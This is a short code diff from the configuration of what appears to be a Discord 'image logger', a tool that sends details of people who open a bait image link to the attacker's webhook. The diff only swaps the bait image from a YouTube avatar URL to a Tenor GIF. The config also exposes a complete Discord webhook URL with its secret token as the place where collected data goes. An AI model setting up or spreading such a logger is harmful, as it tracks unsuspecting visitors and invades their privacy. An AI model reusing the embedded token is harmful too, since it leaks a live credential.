@@ -13,7 +13,7 @@ __author__ = "XSYTHO"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1390198662667440309/M3X9Ibay6lyI11GOjd0PI8s91O9YOaiftX13mVyVI40c_18IWXoLp9Ovyt4u_LVqLq_4",
-    "image": "https://yt3.googleusercontent.com/Y4ntPpwx1458rwWqk8McFhuxM36KPF6i6skKRTL_0yiO5bsafPisx7Mv88IwUZdo--70wf2lZQ=s900-c-k-c0x00ffffff-no-rj", # You can also have a custom image by using a URL argument
+    "image": "https://media1.tenor.com/m/EaWUoC0qHToAAAAd/steve-harvey-gigachad.gif", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
